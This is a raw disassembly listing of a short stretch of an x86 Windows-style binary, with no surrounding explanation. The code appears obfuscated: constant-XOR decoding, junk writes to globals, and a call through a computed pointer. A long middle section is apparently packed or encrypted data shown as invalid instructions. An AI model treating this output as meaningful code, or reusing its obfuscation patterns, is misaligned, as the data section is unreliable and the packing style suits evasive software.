  40f97f:	adc    ecx,DWORD PTR ds:0x4335ab
  40f985:	mov    DWORD PTR ds:0x433663,ecx
  40f98b:	xor    eax,edx
  40f98d:	push   esi
  40f98e:	xor    esi,0x76d3
  40f994:	mov    esi,DWORD PTR [ebp+0x8]
  40f997:	mov    ecx,0x32729a
  40f99c:	add    eax,ecx
  40f99e:	cmp    DWORD PTR [esi+0x54],eax
  40f9a1:	pop    esi
  40f9a2:	je     0x40f9b0
  40f9a8:	mov    eax,DWORD PTR [ebp+0x8]
  40f9ab:	jmp    0x40f9c9
  40f9b0:	mov    eax,DWORD PTR [ebp-0x4]
  40f9b3:	xor    eax,edx
  40f9b5:	add    eax,ecx
  40f9b7:	jmp    0x40f9c9
  40f9bc:	mov    eax,DWORD PTR [ebp-0x4]
  40f9bf:	xor    eax,0x7510853
  40f9c4:	add    eax,0x32729a
  40f9c9:	leave  
  40f9ca:	ret    0x4
  40f9cd:	push   ebp
  40f9ce:	mov    ebp,esp
  40f9d0:	push   ecx
  40f9d1:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9d4:	mov    eax,0x7510853
  40f9d9:	or     DWORD PTR ds:0x4335b3,0x4335af
  40f9e3:	xor    ecx,eax
  40f9e5:	add    DWORD PTR ds:0x433623,0x6057
  40f9ef:	add    ecx,0x32729a
  40f9f5:	mov    DWORD PTR ds:0x433597,0x14d8
  40f9ff:	mov    DWORD PTR [ebp+0x10],ecx
  40fa02:	mov    ecx,0x737
  40fa07:	mov    DWORD PTR [ebp+0x8],0xf34ceb9
  40fa0e:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40fa15:	mov    DWORD PTR ds:0x4335db,edi
  40fa1b:	mov    ecx,0xf89c8534
  40fa20:	mov    DWORD PTR ds:0x433547,0x6b28
  40fa2a:	push   esi
  40fa2b:	mov    esi,DWORD PTR ds:0x43365f
  40fa31:	mov    DWORD PTR [ebp+0x10],0x70019fb
  40fa38:	mov    esi,DWORD PTR [ebp-0x4]
  40fa3b:	cmp    ecx,esi
  40fa3d:	mov    DWORD PTR ds:0x4335e3,0x9e9
  40fa47:	je     0x40fa8c
  40fa4d:	mov    esi,DWORD PTR [ebp+0xc]
  40fa50:	sbb    DWORD PTR ds:0x433633,0x4335a7
  40fa5a:	xor    ecx,eax
  40fa5c:	xor    DWORD PTR ds:0x43361b,0x6006
  40fa66:	xor    esi,eax
  40fa68:	lea    ecx,[esi+ecx*1+0x32729a]
  40fa6f:	xor    DWORD PTR ds:0x4335af,0x4a94
  40fa79:	xor    ecx,eax
  40fa7b:	cmp    ecx,0xf89c8525
  40fa81:	jne    0x40fa2b
  40fa87:	jmp    0x410084
  40fa8c:	add    DWORD PTR ds:0x43361b,ebx
  40fa92:	add    ecx,0xffcd8d66
  40fa98:	xor    DWORD PTR ds:0x4335a3,ebx
  40fa9e:	mov    esi,ecx
  40faa0:	or     DWORD PTR ds:0x43355f,0x3fd0
  40faaa:	xor    esi,eax
  40faac:	mov    DWORD PTR ds:0x43355f,0x62c3
  40fab6:	add    esi,DWORD PTR [ebp+0x8]
  40fab9:	mov    DWORD PTR [ebp+0x8],esi
  40fabc:	or     esi,DWORD PTR ds:0x43355f
  40fac2:	mov    esi,DWORD PTR [ebp+0x8]
  40fac5:	xor    esi,ecx
  40fac7:	xor    esi,eax
  40fac9:	mov    eax,DWORD PTR [edx+0x194]
  40facf:	jmp    0x40fd9e
  40fad4:	daa    
  40fad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad6:	or     DWORD PTR [esi-0x5a484d63],eax
  40fadc:	scas   al,BYTE PTR es:[edi]
  40fadd:	add    al,0x3b
  40fadf:	clc    
  40fae0:	cmp    eax,0x3d04636a
  40fae5:	mov    bl,0x7c
  40fae7:	jl     0x40fa97
  40fae9:	jle    0x40fb67
  40faeb:	jl     0x40fa9a
  40faed:	std    
  40faee:	(bad)  
  40faef:	cmp    bh,BYTE PTR [edi+ebp*2-0x27]
  40faf3:	push   edx
  40faf4:	iret   
  40faf5:	into   
  40faf6:	jnp    0x40fabb
  40faf8:	push   es
  40faf9:	xor    al,0xed
  40fafb:	ja     0x40fa95
  40fafd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fafe:	sub    ebx,ebp
  40fb00:	pusha  
  40fb01:	sbb    ebp,DWORD PTR [ecx-0x4f]
  40fb04:	jb     0x40fb7a
  40fb06:	sub    ch,bl
  40fb08:	stc    
  40fb09:	js     0x40fb84
  40fb0b:	jmp    0xe771029f
  40fb10:	fadd   QWORD PTR [edx]
  40fb12:	pop    edi
  40fb13:	sahf   
  40fb14:	sub    al,ah
  40fb16:	and    eax,0x8a0ee868
  40fb1b:	xor    eax,0x46dd49a8
  40fb20:	cld    
  40fb21:	dec    edx
  40fb22:	push   edx
  40fb23:	sbb    ch,ah
  40fb25:	(bad)  
  40fb26:	mov    ch,0xd5
  40fb28:	aam    0x95
  40fb2a:	cmp    BYTE PTR [ebp+0x34fc221],0x37
  40fb31:	into   
  40fb32:	in     al,dx
  40fb33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb34:	retf   0x8ac8
  40fb37:	mov    dl,0xd6
  40fb39:	(bad)  
  40fb3a:	sbb    edx,edi
  40fb3c:	fmul   QWORD PTR [edi-0x73232c40]
  40fb42:	dec    edi
  40fb43:	setge  BYTE PTR [eax+0x1217414]
  40fb4a:	aas    
  40fb4b:	mov    ds:0xe15cf672,eax
  40fb50:	iret   
  40fb51:	into   
  40fb52:	dec    edx
  40fb53:	jbe    0x40fadb
  40fb55:	xor    al,0x9e
  40fb57:	jmp    0x6b63:0xca82b7a1
  40fb5e:	mov    ch,0xb8
  40fb60:	gs push edx
  40fb62:	dec    ebx
  40fb63:	into   
  40fb64:	inc    esp
  40fb65:	pop    ecx
  40fb66:	pop    eax
  40fb67:	in     eax,0x7c
  40fb69:	repnz adc eax,0x899d4816
  40fb6f:	cmp    al,0x19
  40fb71:	int3   
  40fb72:	stc    
  40fb73:	lock mov dl,0x9f
  40fb76:	xchg   edx,eax
  40fb77:	test   esi,esp
  40fb79:	cs inc esp
  40fb7b:	dec    ebx
  40fb7c:	fstp   TBYTE PTR [eax+0x659a6f3b]
  40fb82:	rcr    DWORD PTR [eax-0x2d],1
  40fb85:	mov    esi,0x8d599ea4
  40fb8a:	loop   0x40fb13
  40fb8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb8d:	fisttp DWORD PTR [ebx-0x640e42ba]
  40fb93:	loopne 0x40fb6c
  40fb95:	loop   0x40fc01
  40fb97:	jns    0x40fbdf
  40fb99:	mov    esi,0x338c18b3
  40fb9e:	(bad)  
  40fb9f:	pop    esi
  40fba0:	mov    dl,0xb3
  40fba2:	pop    edi
  40fba3:	xor    eax,0x12940ec3
  40fba8:	xor    eax,0x72d7f606
  40fbad:	or     cl,bl
  40fbaf:	lahf   
  40fbb0:	outs   dx,BYTE PTR ds:[esi]
  40fbb1:	sub    DWORD PTR [eax],0xe4c691a6
  40fbb7:	xchg   ebp,eax
  40fbb8:	leave  
  40fbb9:	or     esi,DWORD PTR [esi+ebp*1-0x35885813]
  40fbc0:	loopne 0x40fb56
  40fbc2:	sub    al,0x26
  40fbc4:	inc    esp
  40fbc5:	daa    
  40fbc6:	xchg   ebx,eax
  40fbc7:	stos   DWORD PTR es:[edi],eax
  40fbc8:	mov    ss,WORD PTR [ecx-0x6a84cddf]
  40fbce:	push   ebx
  40fbcf:	iret   
  40fbd0:	sub    BYTE PTR [eax+0x2c],bl
  40fbd3:	adc    al,0x57
  40fbd5:	rep lods eax,DWORD PTR ds:[esi]
  40fbd7:	ins    DWORD PTR es:[edi],dx
  40fbd8:	loope  0x40fc1d
  40fbda:	mov    ch,0x89
  40fbdc:	jnp    0x40fc1c
  40fbde:	imul   DWORD PTR [ebx]
  40fbe0:	and    ebp,DWORD PTR [ecx-0x5dec02ea]
  40fbe6:	test   BYTE PTR [edx+0x23b53cd],cl
  40fbec:	and    al,0x1c
  40fbee:	mov    eax,ds:0x7ed1cdad
  40fbf3:	push   0x7e
  40fbf5:	cmp    dl,BYTE PTR [esi-0x6e]
  40fbf8:	pop    ss
  40fbf9:	cdq    
  40fbfa:	popa   
  40fbfb:	aaa    
  40fbfc:	lods   eax,DWORD PTR ds:[esi]
  40fbfd:	mov    cl,0xf7
  40fbff:	mov    dh,0x18
  40fc01:	xor    edi,0xc65d0261
  40fc07:	sbb    eax,0x8b0187cd
  40fc0c:	dec    ecx
  40fc0d:	cmp    BYTE PTR [ecx+0x4b],dh
  40fc10:	jnp    0x40fc7c
  40fc12:	loope  0x40fc41
  40fc14:	sti    
  40fc15:	scas   al,BYTE PTR es:[edi]
  40fc16:	jle    0x40fc8b
  40fc18:	pop    ebx
  40fc19:	pushf  
  40fc1a:	push   ecx
  40fc1b:	retf   0xd5dc
  40fc1e:	imul   edx,DWORD PTR [esp+eax*2-0x5e7e0b5f],0x13
  40fc26:	inc    edx
  40fc27:	mov    cl,0xb8
  40fc29:	dec    ebp
  40fc2a:	mov    dh,0x9
  40fc2c:	jae    0x40fc84
  40fc2e:	xor    bl,BYTE PTR [edx-0x73]
  40fc31:	jmp    0xbfa7:0xbb0a5d86
  40fc38:	mov    ds:0x51e55a71,al
  40fc3d:	in     eax,dx
  40fc3e:	mov    ch,0xfc
  40fc40:	sub    ch,BYTE PTR [ebp+0x3e4a6233]
  40fc46:	adc    ah,cl
  40fc48:	xchg   esi,eax
  40fc49:	fs cmp al,0x48
  40fc4c:	mov    BYTE PTR [ebx],0xd2
  40fc4f:	xchg   BYTE PTR [ebx],bh
  40fc51:	mov    WORD PTR [ebx+0x7d49262],cs
  40fc57:	pop    es
  40fc58:	fsubr  QWORD PTR [edi+0x7d]
  40fc5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc5c:	pop    edi
  40fc5d:	pop    eax
  40fc5e:	adc    DWORD PTR [ebx],0xa
  40fc61:	in     eax,dx
  40fc62:	jmp    0xded6896a
  40fc67:	sbb    DWORD PTR [esi+0x52c89579],edx
  40fc6d:	lahf   
  40fc6e:	aaa    
  40fc6f:	lahf   
  40fc70:	sub    BYTE PTR [ecx+0x117e4ee7],bl
  40fc76:	leave  
  40fc77:	imul   ebp,DWORD PTR [edx],0xffffffae
  40fc7a:	or     ebx,DWORD PTR ds:0xf14f7c95
  40fc80:	adc    bl,BYTE PTR [ebx-0x31]
  40fc83:	(bad)  
  40fc84:	mov    al,ds:0x4cfb97d8
  40fc89:	sub    al,0x45
  40fc8b:	fild   QWORD PTR [edi+0x6e321cd9]
  40fc91:	repz jg 0x40fcfe
  40fc94:	jl     0x40fce9
  40fc96:	test   BYTE PTR [eax-0x7798030],0xe0
  40fc9d:	adc    BYTE PTR [ebx-0x4c],ah
  40fca0:	sbb    eax,0xd9d6c60e
  40fca5:	pusha  
  40fca6:	icebp  
  40fca7:	inc    ecx
  40fca8:	out    dx,eax
  40fca9:	and    DWORD PTR [ebp+0x23],eax
  40fcac:	enter  0xd71f,0xb3
  40fcb0:	inc    esi
  40fcb1:	cs mov edx,0x7242319a
  40fcb7:	fcomp  DWORD PTR [esi-0x7e]
  40fcba:	cli    
  40fcbb:	xor    DWORD PTR [esi+0x4f091554],ebp
  40fcc1:	and    bl,al
  40fcc3:	jne    0x40fcdf
  40fcc5:	(bad)  
  40fcc6:	das    
  40fcc7:	adc    eax,0x67910a50
  40fccc:	iret   
  40fccd:	popf   
  40fcce:	dec    eax
  40fccf:	add    edi,DWORD PTR [ebp+0x5992f691]
  40fcd5:	xchg   esi,ebx
  40fcd7:	add    dh,BYTE PTR [edi+0x4b]
  40fcda:	dec    ebp
  40fcdb:	retf   
  40fcdc:	icebp  
  40fcdd:	jno    0x40fc8d
  40fcdf:	mov    eax,ds:0x3d83ddc
  40fce4:	jmp    0x73120124
  40fce9:	cmp    edx,DWORD PTR [esi+eiz*2-0x15c7c0a0]
  40fcf0:	int    0x66
  40fcf2:	icebp  
  40fcf3:	call   0x6621bf67
  40fcf8:	pop    ebx
  40fcf9:	into   
  40fcfa:	adc    BYTE PTR [edx+0x5d],0x76
  40fcfe:	mov    esp,0x9b201cef
  40fd03:	adc    eax,0x12e04d43
  40fd08:	and    al,0x1
  40fd0a:	sar    BYTE PTR [edi-0x798290a9],cl
  40fd10:	dec    esi
  40fd11:	mov    edi,0xec622d75
  40fd16:	pop    es
  40fd17:	clc    
  40fd18:	into   
  40fd19:	inc    ebx
  40fd1a:	cmp    ch,dh
  40fd1c:	cs adc esp,esp
  40fd1f:	stc    
  40fd20:	mov    ds:0xc507ddc9,eax
  40fd25:	push   cs
  40fd26:	lahf   
  40fd27:	xchg   esp,eax
  40fd28:	or     bl,BYTE PTR [ecx+ecx*4-0x100a33fc]
  40fd2f:	aad    0x5e
  40fd31:	(bad)  
  40fd32:	rol    dl,0x8a
  40fd35:	mov    WORD PTR [ebp-0x470f8f5d],ds
  40fd3b:	cmc    
  40fd3c:	adc    al,0x5f
  40fd3e:	push   edi
  40fd3f:	in     al,dx
  40fd40:	lods   al,BYTE PTR ds:[esi]
  40fd42:	add    DWORD PTR fs:[ebx],0xfe1b1363
  40fd49:	push   0x72
  40fd4b:	mov    ds:0x28fe65ae,al
  40fd50:	add    edi,eax
  40fd52:	sub    ebp,DWORD PTR [eax+0x3853eb12]
  40fd58:	and    al,0xc3
  40fd5a:	adc    DWORD PTR [eax+0x50],ecx
  40fd5d:	cli    
  40fd5e:	jb     0x40fdb6
  40fd60:	cdq    
  40fd61:	aam    0x1f
  40fd63:	dec    edx
  40fd64:	pop    edx
  40fd65:	sub    dl,BYTE PTR [esi]
  40fd67:	xor    ebx,DWORD PTR [esi+0xd9175f8]
  40fd6d:	rcr    BYTE PTR [eax-0x76],cl
  40fd70:	loop   0x40fd12
  40fd72:	int    0x73
  40fd74:	mov    bl,0x44
  40fd76:	not    DWORD PTR [eax-0xa385a59]
  40fd7c:	xchg   cl,ch
  40fd7e:	mov    ds:0x1fc48503,al
  40fd83:	jge    0x40fd3d
  40fd85:	cld    
  40fd86:	pop    es
  40fd87:	call   0x62eb2b45
  40fd8c:	aas    
  40fd8d:	ja     0x40fda2
  40fd8f:	es mov ebx,0x8e57486f
  40fd95:	cs inc ecx
  40fd97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd98:	mov    dl,0x0
  40fd9a:	ret    
  40fd9b:	pop    ecx
  40fd9c:	sub    BYTE PTR [ebx+ecx*4+0x5f151108],dh
  40fda3:	xor    eax,0x418b0043
  40fda8:	cmp    al,0x8b
  40fdaa:	inc    esp
  40fdab:	or     BYTE PTR [eax],ch
  40fdad:	add    eax,ecx
  40fdaf:	mov    DWORD PTR [ebp+0x8],esi
  40fdb2:	mov    DWORD PTR [ebp+0x10],eax
  40fdb5:	jmp    0x410084
  40fdba:	in     al,0xad
  40fdbc:	jae    0x40fd87
  40fdbe:	jge    0x40fd89
  40fdc0:	bound  edi,QWORD PTR [ebp-0x71547538]
  40fdc6:	sbb    ch,dl
  40fdc8:	add    BYTE PTR [ebx],ah
  40fdca:	outs   dx,DWORD PTR ds:[esi]
  40fdcb:	mov    ebp,0x7eae7c7c
  40fdd0:	jl     0x40fe4e
  40fdd2:	call   0x1d29:0x86ecf990
  40fdd9:	inc    edx
  40fdda:	les    eax,FWORD PTR [ecx-0x307e61e1]
  40fde0:	in     eax,dx
  40fde1:	mov    esi,ebx
  40fde3:	aad    0x5d
  40fde5:	push   0x9070887e
  40fdea:	lds    eax,FWORD PTR [edx+0x53]
  40fded:	mov    ecx,0xb9cf7c78
  40fdf2:	and    eax,0xaf12d1f1
  40fdf7:	mov    cl,0x1a
  40fdf9:	jo     0x40fda7
  40fdfb:	inc    esi
  40fdfc:	or     dl,cl
  40fdfe:	xchg   edx,eax
  40fdff:	lods   eax,DWORD PTR ds:[esi]
  40fe00:	and    al,al
  40fe02:	cli    
  40fe03:	test   BYTE PTR [ebx+0x6e],0xd5
  40fe07:	jg     0x40fe18
  40fe09:	jns    0x40fdbf
  40fe0b:	(bad)  
  40fe0c:	fwait
  40fe0d:	pop    ebp
  40fe0e:	xor    eax,0xf6f8405a
  40fe13:	retf   0x96b3
  40fe16:	pop    ds
  40fe17:	ret    
  40fe18:	jl     0x40fe88
  40fe1a:	add    eax,DWORD PTR [edi-0xa2fa633]
  40fe20:	sti    
  40fe21:	mov    al,ds:0x63a656da
  40fe26:	cmp    al,0x6d
  40fe28:	sbb    cl,dl
  40fe2a:	mov    bl,0xbd
  40fe2c:	xor    DWORD PTR [ebx],edx
  40fe2e:	adc    eax,0x335c12c1
  40fe33:	or     eax,0xb8046b6
  40fe38:	adc    al,0x37
  40fe3a:	(bad)  
  40fe3b:	cmp    edi,DWORD PTR [ebp+0x2c]
  40fe3e:	push   DWORD PTR [ebx-0x6cd42825]
  40fe44:	test   DWORD PTR [ecx-0x49],eax
  40fe47:	pop    es
  40fe48:	push   edx
  40fe49:	jp     0x40fe42
  40fe4b:	sbb    al,0xeb
  40fe4d:	add    DWORD PTR [eax],0x12f945c
  40fe53:	or     al,0xec
  40fe55:	arpl   di,bx
  40fe57:	lds    edx,FWORD PTR [esi+0x217b0c71]
  40fe5d:	(bad)  
  40fe5e:	test   ah,0xc
  40fe61:	cdq    
  40fe62:	pop    ds
  40fe63:	mov    cl,0x99
  40fe65:	jp     0x40fed8
  40fe67:	sbb    BYTE PTR [eax+0x3a8f48b3],ah
  40fe6d:	cwde   
  40fe6e:	lea    ecx,[edx+ebp*1+0x6227a58d]
  40fe75:	dec    ecx
  40fe76:	push   ss
  40fe77:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40fe79:	push   esi
  40fe7a:	xchg   edi,eax
  40fe7b:	pop    ds
  40fe7c:	pop    es
  40fe7d:	fiadd  WORD PTR [esi-0x39]
  40fe80:	out    0x81,eax
  40fe82:	mov    edi,0xd20a089
  40fe87:	(bad)  [esp+ebx*2+0x67]
  40fe8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe8c:	call   0x3b6d960f
  40fe91:	scas   al,BYTE PTR es:[edi]
  40fe92:	iret   
  40fe93:	jle    0x40fe5b
  40fe95:	adc    al,0x52
  40fe97:	sti    
  40fe98:	cs cmp ch,bh
  40fe9b:	push   0xffffffc7
  40fe9d:	aad    0x84
  40fe9f:	lahf   
  40fea0:	adc    al,0x80
  40fea2:	ret    
  40fea3:	shr    ch,1
  40fea5:	loope  0x40feee
  40fea7:	mov    edi,es
  40fea9:	sbb    ah,bh
  40feab:	add    edi,ebp
  40fead:	inc    esi
  40feae:	imul   ecx,DWORD PTR [ebp+0x6199b3ef],0xe26b3ab5
  40feb8:	sbb    eax,0xcfd32a1c
  40febd:	aas    
  40febe:	mov    bh,0xaf
  40fec0:	mov    bh,0x1a
  40fec2:	pusha  
  40fec3:	(bad)  
  40fec4:	pop    ss
  40fec5:	clc    
  40fec6:	aad    0x7f
  40fec8:	inc    ebp
  40fec9:	xchg   esp,eax
  40feca:	out    0x6b,al
  40fecc:	mov    ss,ebp
  40fece:	int    0x16
  40fed0:	xor    edi,DWORD PTR [ebp-0xc]
  40fed3:	fsub   st,st(0)
  40fed5:	jmp    0xbbe0:0x4842fdb4
  40fedc:	loopne 0x40ff3f
  40fede:	jns    0x40ff1c
  40fee0:	sbb    BYTE PTR [edx],ch
  40fee2:	cmp    BYTE PTR [esi-0x160e17df],dh
  40fee8:	push   ecx
  40fee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feea:	pop    ecx
  40feeb:	xor    edi,esi
  40feed:	in     al,dx
  40feee:	ins    BYTE PTR es:[edi],dx
  40feef:	lods   eax,DWORD PTR ds:[esi]
  40fef0:	mov    dl,0xbb
  40fef2:	add    bh,bh
  40fef4:	out    0xe1,al
  40fef6:	push   eax
  40fef7:	loopne 0x40ff72
  40fef9:	sub    al,0xe1
  40fefb:	dec    esp
  40fefc:	xchg   BYTE PTR [ebp-0x7d2bc450],cl
  40ff02:	ret    
  40ff03:	push   ebp
  40ff04:	lods   eax,DWORD PTR ds:[esi]
  40ff05:	arpl   WORD PTR [edi-0x52fdcaca],cx
  40ff0b:	inc    edi
  40ff0c:	fcmove st,st(7)
  40ff0e:	sub    bl,BYTE PTR [edx+0x2d]
  40ff11:	and    eax,DWORD PTR [esi]
  40ff13:	int3   
  40ff14:	aas    
  40ff15:	xchg   edi,ecx
  40ff17:	cli    
  40ff18:	ds cmp al,0xb3
  40ff1b:	xchg   ebp,eax
  40ff1c:	pop    ecx
  40ff1d:	xchg   ebx,eax
  40ff1e:	fwait
  40ff1f:	mov    dh,0xca
  40ff21:	add    bl,dh
  40ff23:	aaa    
  40ff24:	into   
  40ff25:	dec    edi
  40ff26:	pop    es
  40ff27:	sub    eax,0xf1d49a57
  40ff2c:	and    eax,0x85a9fd49
  40ff31:	test   BYTE PTR [ebx+0x1646a6c3],cl
  40ff37:	test   eax,0x8686934f
  40ff3c:	jmp    0xe1d5:0x9dd396a0
  40ff43:	and    BYTE PTR [edi],bl
  40ff45:	xchg   BYTE PTR [edx+0x3615b244],al
  40ff4b:	push   edx
  40ff4c:	adc    esi,DWORD PTR [edi+ebp*8-0x6e5c50fc]
  40ff53:	fimul  WORD PTR [ebp+0x3d]
  40ff56:	rcl    esi,0xd7
  40ff59:	jge    0x40ff14
  40ff5b:	pop    esp
  40ff5c:	adc    DWORD PTR [esi-0x6d],ecx
  40ff5f:	and    BYTE PTR [eax-0xa96d911],dl
  40ff65:	stos   BYTE PTR es:[edi],al
  40ff66:	fild   QWORD PTR [esi+0x44]
  40ff69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff6a:	ret    
  40ff6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff6c:	aad    0xb7
  40ff6e:	sbb    DWORD PTR [ecx-0x57c55cee],0xffffffbf
  40ff75:	test   ch,ah
  40ff77:	mov    ah,0x50
  40ff79:	add    esi,DWORD PTR [ebp*4+0x281f3174]
  40ff80:	mov    cl,0xc
  40ff82:	retf   0x6916
  40ff85:	jb     0x40ff30
  40ff87:	jge    0x40ff7c
  40ff89:	test   DWORD PTR [edx-0x112bc706],0x29aaa865
  40ff93:	or     dl,ch
  40ff95:	ds (bad) 
  40ff97:	mov    esi,0x44f7aeca
  40ff9c:	sahf   
  40ff9d:	shr    eax,0xf3
  40ffa0:	test   DWORD PTR [ecx+edi*2-0x78e02d00],ecx
  40ffa7:	mov    al,0x4d
  40ffa9:	xor    al,0x14
  40ffab:	or     eax,0xa4cbb9a6
  40ffb0:	fadd   QWORD PTR [edi]
  40ffb2:	out    0xbd,al
  40ffb4:	mov    ecx,0xaa22878e
  40ffb9:	and    esi,DWORD PTR [edi-0x1b153b7c]
  40ffbf:	dec    esi
  40ffc0:	cmp    DWORD PTR [esi],edx
  40ffc2:	adc    DWORD PTR [edi+0x466b52b9],esp
  40ffc8:	lods   eax,DWORD PTR ds:[esi]
  40ffc9:	shl    BYTE PTR [edx-0x4d9659ad],1
  40ffcf:	into   
  40ffd0:	and    ebx,DWORD PTR [eax+ecx*4+0x53]
  40ffd4:	rcr    DWORD PTR [eax],cl
  40ffd6:	repnz cmp edi,esi
  40ffd9:	sub    esi,ebx
  40ffdb:	dec    edi
  40ffdc:	addr16 push esp
  40ffde:	push   eax
  40ffdf:	enter  0x7f77,0xdd
  40ffe3:	dec    ecx
  40ffe4:	lahf   
  40ffe5:	cmp    dl,BYTE PTR [esi+0x32]
  40ffe8:	in     eax,dx
  40ffe9:	jno    0x40ffa0
  40ffeb:	push   ecx
  40ffec:	ds into 
  40ffee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffef:	cdq    
  40fff0:	aaa    
  40fff1:	jmp    0xa5f7937
  40fff6:	loopne 0x41003b
  40fff8:	xchg   edi,eax
  40fff9:	mov    ah,0xfb
  40fffb:	into   
  40fffc:	pop    ebp
  40fffd:	imul   edi,DWORD PTR [ebp+0x55522369],0x6c
  410004:	sbb    BYTE PTR [ebp-0x6f5c5947],ah
  41000a:	mov    eax,0x22651c5e
  41000f:	cmc    
  410010:	dec    esp
  410011:	fist   DWORD PTR [eax]
  410013:	aam    0x3c
  410015:	mov    ebp,fs
  410017:	push   ecx
  410018:	ja     0x41003a
  41001a:	jg     0x40fff7
  41001c:	ins    BYTE PTR es:[edi],dx
  41001d:	inc    esp
  41001e:	fbstp  TBYTE PTR [ecx-0x2f0177d0]
  410024:	sub    eax,0x8ba16a87
  410029:	outs   dx,DWORD PTR ds:[esi]
  41002a:	and    dl,bl
  41002c:	pop    esi
  41002d:	test   BYTE PTR [ebx-0x3d],dl
  410030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410031:	frstor [si+0x40ae]
  410036:	mov    esi,0x12e12ac
  41003b:	mov    ebp,0x36f42fb7
  410040:	or     BYTE PTR [ecx],0x66
  410043:	add    esi,DWORD PTR [ecx]
  410045:	adc    al,0x82
  410047:	cmp    al,0x40
  410049:	jns    0x4100bc
  41004b:	retf   
  41004c:	jmp    0x41008d
  41004e:	jne    0x4100af
  410050:	loopne 0x40ffe4
  410052:	pop    esp
  410053:	pop    ss
  410054:	xchg   eax,esi
  410056:	sahf   
  410057:	pushf  
  410058:	dec    edi
  410059:	fmul   QWORD PTR [edi]
  41005b:	push   edi
  41005c:	pop    ecx
  41005d:	out    0x58,eax
  41005f:	push   ecx
  410060:	mov    esi,0x9010ba5b
  410065:	(bad)  
  410066:	jl     0x410059
  410068:	push   edx
  410069:	sub    eax,0x420affc1
  41006e:	fiadd  DWORD PTR [ebp+0x57a452d8]
  410074:	in     eax,0xa9
  410076:	cli    
  410077:	into   
  410078:	pop    esp
  410079:	pop    ss
  41007a:	lahf   
  41007b:	js     0x41004e
  41007d:	frstor [eax+0x5c]
  410080:	pop    edx
  410081:	cld    
  410082:	sbb    al,bh
  410084:	mov    eax,DWORD PTR [ebp+0x10]
  410087:	pop    esi
  410088:	test   eax,eax
  41008a:	je     0x4100ae
  410090:	push   DWORD PTR ds:0x413bee
  410096:	push   DWORD PTR ds:0x41399a
  41009c:	mov    eax,DWORD PTR [edx+0x194]
  4100a2:	push   DWORD PTR [eax]
  4100a4:	mov    eax,DWORD PTR [ebp+0x10]
  4100a7:	call   eax
  4100a9:	jmp    0x4100b1
  4100ae:	mov    eax,DWORD PTR [ebp+0x10]
  4100b1:	leave  
  4100b2:	ret    0xc
  4100b5:	push   ebp
  4100b6:	mov    ebp,esp
  4100b8:	sub    esp,0x30
  4100bb:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  4100c2:	and    DWORD PTR ds:0x4335df,0x0
  4100cc:	jmp    0x4100dc
  4100d1:	mov    eax,ds:0x4335df
  4100d6:	inc    eax
  4100d7:	mov    ds:0x4335df,eax
  4100dc:	cmp    DWORD PTR ds:0x4335df,0x1a
  4100e3:	jae    0x41011c
  4100e9:	cmp    DWORD PTR ds:0x4335df,0x4
  4100f0:	jne    0x4100ff
  4100f6:	push   DWORD PTR [ebp-0x20]
  4100f9:	call   DWORD PTR ds:0x4120d4
  4100ff:	cmp    DWORD PTR ds:0x4335df,0x3
  410106:	jne    0x410117
  41010c:	mov    eax,ds:0x4335df
  410111:	inc    eax
  410112:	mov    ds:0x4335df,eax
  410117:	jmp    0x4100d1
  41011c:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  410123:	sbb    eax,DWORD PTR ds:0x433673
  410129:	mov    ecx,DWORD PTR [ebp-0x4]
  41012c:	push   ebx
  41012d:	mov    eax,0x7510853
  410132:	dec    ebx
  410133:	xor    ecx,eax
  410135:	or     DWORD PTR ds:0x433557,0x33e5
  41013f:	mov    ebx,0x32729a
  410144:	sbb    DWORD PTR ds:0x4335df,0x4335e3
  41014e:	add    ecx,ebx
  410150:	and    DWORD PTR ds:0x43354f,0x433547
  41015a:	mov    DWORD PTR [ebp-0x1c],ecx
  41015d:	mov    ecx,DWORD PTR [ebp+0x14]
  410160:	sub    DWORD PTR ds:0x4335e7,0x6109
  41016a:	push   esi
  41016b:	push   edi
  41016c:	sbb    DWORD PTR ds:0x433623,0x433657
  410176:	test   ecx,ecx
  410178:	je     0x410196
  41017e:	mov    DWORD PTR ds:0x433657,0x2f8
  410188:	mov    ecx,DWORD PTR [ebp+0x14]
  41018b:	mov    ecx,DWORD PTR [ecx]
  41018d:	and    edi,DWORD PTR ds:0x433597
  410193:	mov    DWORD PTR [ebp-0x1c],ecx
  410196:	add    DWORD PTR ds:0x433623,0x2cfa
  4101a0:	imul   edx,eax
  4101a3:	add    DWORD PTR ds:0x433557,edx
  4101a9:	mov    ecx,0x4573
  4101ae:	xor    edi,edi
  4101b0:	or     edi,DWORD PTR ds:0x433677
  4101b6:	mov    esi,DWORD PTR ds:0x43368b
  4101bc:	sub    edi,esi
  4101be:	xor    edi,DWORD PTR [edi+esi*1]
  4101c1:	add    edx,ecx
  4101c3:	sub    DWORD PTR ds:0x433563,0x43359b
  4101cd:	mov    esi,0x7879
  4101d2:	mov    edi,0x1556
  4101d7:	xchg   esi,ecx
  4101d9:	and    DWORD PTR ds:0x433633,0x0
  4101e3:	mov    ecx,DWORD PTR ds:0x433633
  4101e9:	inc    ecx
  4101ea:	mov    DWORD PTR ds:0x433633,ecx
  4101f0:	cmp    DWORD PTR ds:0x433633,0x29
  4101f7:	jne    0x41023f
  4101fd:	push   0x433814
  410202:	push   DWORD PTR [ebp-0x14]
  410205:	push   DWORD PTR [ebp-0xc]
  410208:	push   0x8a72
  41020d:	push   0x8052
  410212:	push   0x5318
  410217:	push   0x69ba
  41021c:	push   0x74de
  410221:	push   0x7da6
